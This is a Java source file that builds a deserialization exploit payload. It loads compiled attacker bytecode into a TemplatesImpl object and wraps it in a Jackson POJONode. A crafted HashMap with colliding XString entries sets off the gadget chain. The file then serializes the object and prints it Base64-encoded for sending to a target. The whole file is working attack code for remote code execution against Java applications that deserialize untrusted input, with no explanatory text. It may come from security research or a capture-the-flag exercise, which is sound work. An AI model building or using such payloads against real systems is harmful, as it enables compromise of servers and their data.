package jackson;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.NotFoundException;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class hashmap_tostring {
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NotFoundException, CannotCompileException {
        TemplatesImpl obj = new TemplatesImpl();
        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
        byte[][] bytecode = new byte[][]{bytecodes};
        setFieldValue(obj, "_bytecodes",bytecode);
        setFieldValue(obj, "_name", "zero");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(obj, "_sdom", new ThreadLocal());
        POJONode a = new POJONode(obj);

//        BadAttributeValueExpException exp = new BadAttributeValueExpException(1);
//        setFieldValue(exp,"val",a);

        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);

        XString xString = new XString("xx");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", a);
        map1.put("zZ", xString);
        map2.put("yy", xString);
        map2.put("zZ", a);


        Array.set(tbl, 0, nodeCons.newInstance(0, map1, map1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, map2, map2, null));

        setFieldValue(s, "table", tbl);

        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(bytes);
        objectOutputStream.writeObject(s);
        byte[] output = Base64.getEncoder().encode(bytes.toByteArray());
        System.out.println(output);
    }
}
